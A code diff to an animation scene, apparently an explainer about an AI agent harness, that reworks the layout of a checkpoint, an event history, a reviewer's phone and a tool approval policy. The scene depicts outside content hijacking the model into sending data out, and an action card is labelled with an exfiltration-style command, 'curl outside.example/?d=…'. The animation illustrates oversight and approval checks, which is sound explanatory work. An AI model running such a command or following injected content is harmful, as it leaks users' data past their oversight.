@@ -17,8 +17,8 @@
 // sends data out. The model steps up and aside for Maya's phone, which shows the data and the document it came from;
 // the three routes light up converging on the checkpoint (EVERY WAY OUT), and Maya taps Reject: the checkpoint
 // shuts, REJECTED BY MAYA, on record. Then the workers and the sandbox slide away for the Temporal Agent Harness's
-// TOOL APPROVAL POLICY, and the Event History slides under the held ticket: three columns (the model over Maya's
-// phone, the checkpoint and its history, the policy). Three rules light up in the subtitle's order, read_file RUN
+// TOOL APPROVAL POLICY: three columns (the model over Maya's phone, the held ticket and the checkpoint over the
+// Event History, the policy). Three rules light up in the subtitle's order, read_file RUN
 // (an allowed tool), create_ticket ASK A PERSON (not on the allowed list), as Maya's phone glows violet with it,
 // and delete_volume REFUSED by auto mode's rule on its arguments, the reason sent back to the model.
 // The camera zoom-through (setCamera) brings the scene in and plays into chapter 5.
@@ -67,11 +67,37 @@
   // the x where each flying card's curve turns from the orb's line to its own
   const LEAK_BEND = 1200;
 
-  // ---------- the board half: the model and the checkpoint at BOARD's places, the Event History strip at HISTORY
-  // (below); on the right, in BOARD.tools' column (x 1380-1800), the YOUR WORKERS zone (y 182-520) holding three
-  // tool tiles 84 px apart, then the SANDBOX box 24 px under it (y 544-856), its bottom level with the Event History's
+  // ---------- the board half: the model at BOARD's place, the checkpoint (CP) and the Event History strip (HISTORY)
+  // in the center column (below); on the right, in BOARD.tools' column (x 1380-1800), the YOUR WORKERS zone
+  // (y 182-520) holding three tool tiles 84 px apart, then the SANDBOX box 24 px under it (y 544-856), its bottom
+  // level with the Event History's
   const { laneY } = BOARD;
-  const GATE_RIGHT = BOARD.checkpoint.x + CHECKPOINT.w / 2;
+  // the terminal call the agent sends into the sandbox, and the ticket it sends to an outside project
+  const CALL = { tool: 'terminal', arg: 'curl outside.example/?d=…' };
+  const TICKET = { tool: 'create_ticket', arg: 'outside project: PRJ-1042…' };
+  // Maya's phone on the left, on the content frame's left edge (x 120-440), its bottom on the Event History's bottom
+  // edge; the model, stepped up and aside above it at 2/3 of its size (120 px), its red glow (216 px) from the
+  // content frame's top (y 150), 38 px clear of the phone. Its AI MODEL label fades out as it steps aside and back
+  // in on its right, 20 px clear, at a size that reads 16 px once scaled: under it, the label would crowd the phone.
+  // The orb and its label (about 94 px) together are centered over the phone. In the orb's own px (before the
+  // scale): the label's font size and its left edge.
+  const PHONE = { x: 280, y: BOARD.history.y + BOARD.history.h / 2 - APPROVAL_CARD.h / 2 };
+  const ORB_ASIDE = { x: 222, y: 258, scale: 2 / 3, labelFont: 24, labelLeft: BOARD.model.size + 30 };
+  // the center column, GUTTER px right of the phone (x 516-1236): the Event History strip, 720 px wide where
+  // BOARD.history is 800, on BOARD.history's line, so its bottom stays on the phone's and the sandbox's (y 856);
+  // over it, centered, the ticket held at the gate (its card, x 594-918), HELD_GAP px clear of the checkpoint
+  // (x 958-1158) under its FLAGGED badge. The policy panel of c[4] (below) takes the right column, GUTTER px on.
+  const GUTTER = 76;
+  const HISTORY = { ...BOARD.history, x: PHONE.x + APPROVAL_CARD.w / 2 + GUTTER + 360, w: 720 };
+  const HELD_GAP = 40;
+  const HELD_LEFT = HISTORY.x - (cardWidth(TICKET) + HELD_GAP + CHECKPOINT.w) / 2;
+  const CP = { ...BOARD.checkpoint, x: HELD_LEFT + cardWidth(TICKET) + HELD_GAP + CHECKPOINT.w / 2 };
+  const GATE_RIGHT = CP.x + CHECKPOINT.w / 2;
+  // An action card's stops on this board, each [x, y]: from, the orb's center (the card grows out of it); gate, in
+  // front of the checkpoint, HELD_GAP px clear of it (where it waits, or passes)
+  const cardStops = card => ({
+    from: [BOARD.model.x, laneY], gate: [CP.x - CHECKPOINT.w / 2 - HELD_GAP - card.w / 2, laneY],
+  });
   const ZONE = { x: 1590, y: 351, w: 420, h: 338 };
   const COLUMN_LEFT = ZONE.x - ZONE.w / 2;
   const ZONE_PITCH = 84;
@@ -91,9 +117,6 @@
   // (the sandboxed Worker still reaches Temporal, hence no internet rather than no network)
   const BOX_BADGES = [['keyOff', 'No keys'], ['wifiOff', 'No internet']];
   const BOX_REST = [BOX.x, 676];
-  // the terminal call the agent sends into the sandbox, and the ticket it sends to an outside project
-  const CALL = { tool: 'terminal', arg: 'curl outside.example/?d=…' };
-  const TICKET = { tool: 'create_ticket', arg: 'outside project: PRJ-1042…' };
   // the lanes from the checkpoint's right edge: one to each zone tool, level with it, and one to the sandbox, level
   // with the call's rest; each one's Bezier control points, for the cards and chips that ride it
   const LANE_ENDS = [...ZONE_TOOLS.map((_, i) => zoneSlot(i)[1]), BOX_REST[1]];
@@ -103,7 +126,7 @@
   const curvePoints = (curve, n = 16) => Array.from({ length: n + 1 }, (_, k) => bezier(curve, k / n));
   // the FLAGGED badge at the checkpoint's tag spot (20 px over its top), with its padlock
   const FLAG_BADGE = { w: 188, h: 40 };
-  const FLAG_SPOT = [BOARD.checkpoint.x, BOARD.checkpoint.y - BOARD.checkpoint.h / 2 - 40];
+  const FLAG_SPOT = [CP.x, CP.y - CP.h / 2 - 40];
   // the Q3 plan, back from the shared files: a chip that rides the first lane into the checkpoint, then the orb
   const CHIP = { w: 180, h: 48 };
   // the model's tendril at the badge: from the orb's upper right to 6 px short of the badge's left edge
@@ -111,19 +134,8 @@
     [BOARD.model.x + 64, laneY - 64], [480, 200], [700, 150],
     [FLAG_SPOT[0] - FLAG_BADGE.w / 2 - 6, FLAG_SPOT[1]],
   ];
-  // the Event History strip, 720 px wide (x 600-1320) where BOARD.history is 800: 60 px clear of the sandbox; same
-  // center, so its bottom stays on the phone's and the sandbox's (y 856)
-  const HISTORY = { ...BOARD.history, w: 720 };
-  // Maya's phone on the left, on the content frame's left edge (x 120-440), its bottom on the Event History's bottom
-  // edge; the model, stepped up and aside above it at 2/3 of its size (120 px), its red glow (216 px) from the
-  // content frame's top (y 150), 38 px clear of the phone. Its AI MODEL label fades out as it steps aside and back
-  // in on its right, 20 px clear, at a size that reads 16 px once scaled: under it, the label would crowd the phone.
-  // The orb and its label (about 94 px) together are centered over the phone. In the orb's own px (before the
-  // scale): the label's font size and its left edge.
-  const PHONE = { x: 280, y: HISTORY.y + HISTORY.h / 2 - APPROVAL_CARD.h / 2 };
-  const ORB_ASIDE = { x: 222, y: 258, scale: 2 / 3, labelFont: 24, labelLeft: BOARD.model.size + 30 };
   // the EVERY WAY OUT caption over the lanes, between the checkpoint and the zone, level with the zone's heading
-  const CAPTION = { x: LANE_MID, y: ZONE.y - ZONE.h / 2 + 37, w: 220 };
+  const CAPTION = { x: LANE_MID, y: ZONE.y - ZONE.h / 2 + 37, w: 180 };
   const HISTORY_ROWS = [
     '<b>outside content read</b> Q3 plan',
     '<b>terminal</b> curl outside.example',
@@ -165,21 +177,16 @@
   };
   // the routes that light up, as lane indices: tickets, web search, the sandbox
   const ROUTE_LANES = [1, 2, 3];
-  // from c[4]: the zone, the sandbox and their lanes slide away (out, outD) as the Event History slides left under
-  // the held ticket (shift, shiftD) and the policy panel slides in (policy); its rules light up in the subtitle's
-  // order: run, ask, refuse (lit, by row); Maya's phone glows violet with the ASK row; the refused row's reason line
-  // slides in (reason)
-  const T4 = { out: 0, outD: 0.5, shift: 0.2, shiftD: 0.6, policy: 0.5, lit: [1.6, 3.0, 4.4], reason: 4.8 };
+  // from c[4]: the zone, the sandbox and their lanes slide away (out, outD) as the policy panel slides in (policy);
+  // its rules light up in the subtitle's order: run, ask, refuse (lit, by row); Maya's phone glows violet with the
+  // ASK row; the refused row's reason line slides in (reason)
+  const T4 = { out: 0, outD: 0.5, policy: 0.5, lit: [1.6, 3.0, 4.4], reason: 4.8 };
 
   // ---------- the c[4] composition: three columns across x 120-1800, their tops on y 150, their bottoms on y 856,
-  // with equal gutters. Left, the model over Maya's phone (x 120-440). Center, from the left edge of the ticket held
-  // at the gate (20 px clear of the checkpoint), the checkpoint under its FLAGGED badge, the Event History under
-  // them, its left edge on the ticket's (x 516-1236). Right, the policy panel, to the content frame's right edge.
+  // GUTTER px apart: the model over Maya's phone (x 120-440), the center column (x 516-1236, see HISTORY), the
+  // policy panel, to the content frame's right edge
   const COLUMNS = { top: 150, bottom: 856, right: 1800 };
-  const HELD_LEFT = BOARD.checkpoint.x - CHECKPOINT.w / 2 - 20 - cardWidth(TICKET);
-  const GUTTER = HELD_LEFT - (PHONE.x + APPROVAL_CARD.w / 2);
-  const HISTORY_SHIFT = HELD_LEFT + HISTORY.w / 2 - HISTORY.x;
-  const POLICY_LEFT = HELD_LEFT + HISTORY.w + GUTTER;
+  const POLICY_LEFT = HISTORY.x + HISTORY.w / 2 + GUTTER;
 
   // ---------- the Temporal Agent Harness's tool approval policy, the right column (x 1312-1800, y 150-856): its
   // heading, then three rule rows of one height, 20 px apart, 24 px in from the panel's sides and bottom. In a row,
@@ -468,13 +475,13 @@
       s.box = makeSandbox(root);
       const boardSvg = svgLayer(root);
       s.laneIn = path(boardSvg, `M ${BOARD.model.x + BOARD.model.size / 2 + 16} ${laneY} `
-        + `H ${BOARD.checkpoint.x - CHECKPOINT.w / 2}`, C.line, 2, false);
+        + `H ${CP.x - CHECKPOINT.w / 2}`, C.line, 2, false);
       s.lanes = LANE_ENDS.map(y => path(boardSvg, sCurveD(GATE_RIGHT, laneY, COLUMN_LEFT, y), C.line, 2, false));
       // the routes that light up, violet copies of their lanes, and the sparks that run them into the checkpoint
       s.routeLanes = ROUTE_LANES.map(i => path(boardSvg, sCurveD(GATE_RIGHT, laneY, COLUMN_LEFT, LANE_ENDS[i]),
         C.violet, 3, false));
       s.routeSparks = ROUTE_LANES.map(() => makeSpark(root, 16, RGB.violet));
-      s.checkpoint = makeCheckpoint(root, BOARD.checkpoint);
+      s.checkpoint = makeCheckpoint(root, CP);
       s.flagRipples = makeRipples(root, 2, RGB.red);
       // the terminal call's request at the sandbox's right wall, the wall's red flash and the sparks of the hit
       // (from 5 px right of the call's card at rest to 6 px short of the wall)
@@ -524,13 +531,13 @@
       // ---------- what passes under the orb: the Q3 plan chip and the two action cards grow out of it or sink into it
       s.chip = makeChip(root);
       s.chipRoute1 = [zoneSlot(0), [COLUMN_LEFT, LANE_ENDS[0]], ...curvePoints(laneCurve(LANE_ENDS[0])).reverse(),
-        [BOARD.checkpoint.x, laneY]];
-      s.chipRoute2 = [[BOARD.checkpoint.x, laneY], [BOARD.model.x, laneY]];
+        [CP.x, laneY]];
+      s.chipRoute2 = [[CP.x, laneY], [BOARD.model.x, laneY]];
       s.call = makeCard(root, CALL);
-      s.callStops = actionStops(s.call, 0);
+      s.callStops = cardStops(s.call);
       s.callRoute = [s.callStops.gate, ...curvePoints(laneCurve(BOX_REST[1])), BOX_REST];
       s.ticket = makeCard(root, TICKET);
-      s.ticketStops = actionStops(s.ticket, 1);
+      s.ticketStops = cardStops(s.ticket);
 
       // the orb, in a mount that scales it when it steps aside (class cam: the layout check measures it as shown)
       s.orbMount = E(root, '', 'cam', { width: 0, height: 0, opacity: 1 });
@@ -577,7 +584,8 @@
       s.flash = makeFlash(stage);
     },
     update(t, c, s) {
-      const { model, checkpoint } = BOARD;
+      const { model } = BOARD;
+      const checkpoint = CP;
       const hijackAt = c[1] + T1.hijack;
       const outAt = c[2] + T2.out;
       const flagAt = c[2] + T2.chip + T2.chipD1;
@@ -682,9 +690,7 @@
       const lanesIn = P(t, c[2] + T2.lanes, T2.lanesD);
       draw(s.laneIn, lanesIn, 1 - aside);
       s.lanes.forEach((lane, i) => draw(lane, P(t, c[2] + T2.lanes + 0.1 * i, T2.lanesD), kept));
-      // c[4]: the Event History slides left under the held ticket, the center column of the policy's composition
-      const historyX = HISTORY.x + Math.round(HISTORY_SHIFT * P(t, c[4] + T4.shift, T4.shiftD));
-      rise(s.history, historyX, HISTORY.y, P(t, c[2] + T2.history, 0.6));
+      rise(s.history, HISTORY.x, HISTORY.y, P(t, c[2] + T2.history, 0.6));
 
       // the AI model: it pops in beside the shared files and looks at them, turns red as the order reaches it and
       // watches the data leave; with Temporal it flies to its place on the board, calming down, turns red again as
